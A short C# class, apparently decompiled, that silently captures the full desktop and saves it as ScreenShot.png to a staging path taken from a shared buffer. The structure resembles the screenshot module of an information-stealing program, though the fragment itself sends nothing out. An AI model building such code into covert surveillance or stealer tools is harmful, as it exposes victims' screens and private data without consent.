using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

internal class DesktopImg
{
	public static void Start()
	{
		string text = $"{Buffer.path_l}ScreenShot.png";
		try
		{
			Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
			Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
			bitmap.Save(text, ImageFormat.Png);
		}
		catch
		{
			File.WriteAllText(text, "");
		}
	}
}
